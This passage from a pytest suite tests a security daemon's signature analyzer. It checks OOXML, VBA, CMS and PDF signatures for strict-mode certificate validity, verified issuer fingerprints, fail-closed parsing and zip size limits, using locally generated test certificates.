    def test_ooxml_document_signature_ignores_unsigned_timestamp(
        self, daemon, tmp_path
    ):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        document = _make_ooxml_document_signature_zip(
            cert,
            key_file,
            cert_file,
            unsigned_timestamp="2099-01-01T00:00:00Z",
        )
        result = daemon.analyze_signatures(document, "timestamp.docx")
        assert "timestamp" not in result["signatures"][0]

    def test_ooxml_issuer_fingerprint_requires_verified_issuer(self, daemon, tmp_path):
        from cryptography.hazmat.primitives import hashes as _test_hashes

        ca_dir = tmp_path / "ca"
        ca_dir.mkdir()
        _ca_key, _ca_file, ca_cert = _make_test_cert_key(ca_dir)
        key_file, cert_file, leaf_cert = _make_test_cert_key(
            tmp_path, issuer_name=ca_cert.subject
        )
        document = _make_ooxml_document_signature_zip(
            leaf_cert,
            key_file,
            cert_file,
            additional_cert=ca_cert,
        )
        result = daemon.analyze_signatures(document, "spoofed-issuer.docx")
        entry = result["signatures"][0]
        assert entry["issuer_fingerprint"] == (
            "sha256:" + leaf_cert.fingerprint(_test_hashes.SHA256()).hex()
        )

    def test_certificate_policy_parse_errors_fail_closed(self, daemon):
        class _BrokenAsn1Usage:
            @property
            def key_usage_value(self):
                raise ValueError("malformed KeyUsage")

        class _BrokenAsn1Time:
            @property
            def not_valid_before(self):
                raise ValueError("malformed validity")

        class _BrokenX509Usage:
            @property
            def extensions(self):
                raise ValueError("malformed extensions")

        class _BrokenX509Time:
            @property
            def not_valid_before_utc(self):
                raise ValueError("malformed validity")

        assert daemon._asn1_cert_key_usage_valid(_BrokenAsn1Usage()) is False
        assert daemon._asn1_cert_time_valid(_BrokenAsn1Time()) is False
        assert daemon._x509_cert_key_usage_valid(_BrokenX509Usage()) is False
        assert daemon._x509_cert_time_valid(_BrokenX509Time()) is False

    def test_ooxml_document_signature_expired_certificate_strict_mode(
        self, daemon, tmp_path, monkeypatch
    ):
        import datetime as _dt

        now = _dt.datetime.now(_dt.timezone.utc)
        key_file, cert_file, cert = _make_test_cert_key(
            tmp_path,
            not_valid_before=now - _dt.timedelta(days=30),
            not_valid_after=now - _dt.timedelta(days=1),
        )
        document = _make_ooxml_document_signature_zip(cert, key_file, cert_file)

        result = daemon.analyze_signatures(document, "expired.docx")
        entry = result["signatures"][0]
        assert entry["cert_time_valid"] is False
        assert entry["valid"] is True  # non-strict (default): crypto-only

        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["signature"], "strict", True
        )
        strict_result = daemon.analyze_signatures(document, "expired.docx")
        assert strict_result["signatures"][0]["valid"] is False

    def test_ooxml_document_signature_key_usage_restricted_strict_mode(
        self, daemon, tmp_path, monkeypatch
    ):
        from cryptography import x509 as _test_x509

        key_usage = _test_x509.KeyUsage(
            digital_signature=False,
            content_commitment=False,
            key_encipherment=True,
            data_encipherment=False,
            key_agreement=False,
            key_cert_sign=False,
            crl_sign=False,
            encipher_only=False,
            decipher_only=False,
        )
        key_file, cert_file, cert = _make_test_cert_key(tmp_path, key_usage=key_usage)
        document = _make_ooxml_document_signature_zip(cert, key_file, cert_file)

        result = daemon.analyze_signatures(document, "restricted.docx")
        entry = result["signatures"][0]
        assert entry["key_usage_valid"] is False
        assert entry["valid"] is True  # non-strict (default): crypto-only

        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["signature"], "strict", True
        )
        strict_result = daemon.analyze_signatures(document, "restricted.docx")
        assert strict_result["signatures"][0]["valid"] is False

    def test_vba_signature_expired_certificate_strict_mode(
        self, daemon, tmp_path, monkeypatch
    ):
        import datetime as _dt

        now = _dt.datetime.now(_dt.timezone.utc)
        key_file, cert_file, _cert = _make_test_cert_key(
            tmp_path,
            not_valid_before=now - _dt.timedelta(days=30),
            not_valid_after=now - _dt.timedelta(days=1),
        )
        digsig = _make_vba_digsig_blob(key_file, cert_file)

        entry = daemon._parse_vba_digsig(digsig)
        assert entry["cert_time_valid"] is False
        assert entry["valid"] is True  # non-strict (default): crypto-only

        monkeypatch.setitem(
            xspct.config["xspct_analyzers"]["signature"], "strict", True
        )
        strict_entry = daemon._parse_vba_digsig(digsig)
        assert strict_entry["valid"] is False

    def test_cms_issuer_fingerprint_requires_verified_issuer(self, daemon, tmp_path):
        from cryptography.hazmat.primitives import hashes as _test_hashes
        from cryptography.hazmat.primitives import serialization as _test_serialization

        ca_dir = tmp_path / "ca"
        ca_dir.mkdir()
        _ca_key, _ca_file, ca_cert = _make_test_cert_key(ca_dir)
        key_file, cert_file, leaf_cert = _make_test_cert_key(
            tmp_path, issuer_name=ca_cert.subject
        )
        digsig = _make_vba_digsig_blob(key_file, cert_file)
        (cms_size,) = struct.unpack_from("<I", digsig, 0)
        signed_data = xspct._cms.ContentInfo.load(digsig[4 : 4 + cms_size])["content"]
        signed_data["certificates"].append(
            xspct._cms.CertificateChoices(
                name="certificate",
                value=xspct._asn1_x509.Certificate.load(
                    ca_cert.public_bytes(_test_serialization.Encoding.DER)
                ),
            )
        )
        signing_cert = next(
            choice.chosen
            for choice in signed_data["certificates"]
            if choice.chosen.dump()
            == leaf_cert.public_bytes(_test_serialization.Encoding.DER)
        )
        assert daemon._cms_issuer_fingerprint(signed_data, signing_cert) == (
            "sha256:" + leaf_cert.fingerprint(_test_hashes.SHA256()).hex()
        )

    def test_ooxml_document_signature_respects_zip_read_limit(
        self, daemon, tmp_path, monkeypatch
    ):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        document = _make_ooxml_document_signature_zip(cert, key_file, cert_file)
        with zipfile.ZipFile(io.BytesIO(document)) as z:
            limit = (
                sum(
                    z.getinfo(name).file_size
                    for name in ("_xmlsignatures/sig1.xml", "word/document.xml")
                )
                - 1
            )
        monkeypatch.setitem(xspct.config, "xspct_archive_max_size", limit)
        assert daemon.analyze_signatures(document, "oversize.docx") is None

    # -----------------------------------------------------------------------
    # PDF signature (PAdES) via a real pyhanko-signed fixture
    # -----------------------------------------------------------------------

    @pytest.mark.skipif(not _HAS_PYMUPDF, reason="pymupdf not installed")
    def test_pdf_signature_valid(self, daemon, tmp_path):
        from pyhanko.pdf_utils.incremental_writer import IncrementalPdfFileWriter
        from pyhanko.sign import signers as _signers

        key_file, cert_file, _cert = _make_test_cert_key(tmp_path)
        signer = _signers.SimpleSigner.load(key_file, cert_file)

        doc = _pymupdf.open()
        doc.new_page()
        plain_pdf = doc.tobytes()
        doc.close()

        writer = IncrementalPdfFileWriter(io.BytesIO(plain_pdf))
        signed_pdf = _signers.sign_pdf(
            writer,
            _signers.PdfSignatureMetadata(field_name="Sig1"),
            signer=signer,
        ).getvalue()

        result = daemon.analyze_signatures(signed_pdf, "signed.pdf")
        assert result is not None
        sigs = result["signatures"]
        assert len(sigs) == 1
        entry = sigs[0]
        assert entry["type"] == "pdf"
        assert entry["valid"] is True
        assert entry["trusted"] is False
        assert entry["key_usage_valid"] is True
        assert entry["cert_time_valid"] is True
        assert entry["covers_whole_document"] is True
        assert "Test Signer" in entry["signer"]

    # -----------------------------------------------------------------------
    # No-signature / non-container inputs
    # -----------------------------------------------------------------------

    def test_no_signature_returns_none(self, daemon):
        assert daemon.analyze_signatures(PDF_CLEAN, "clean.pdf") is None

    def test_empty_bytes_returns_none(self, daemon):
        assert daemon.analyze_signatures(b"", "empty.pdf") is None

    def test_disabled_when_pyhanko_missing(self, daemon, monkeypatch):
        monkeypatch.setattr(xspct, "HAS_PYHANKO", False)
        assert daemon.analyze_signatures(PDF_CLEAN, "clean.pdf") is None
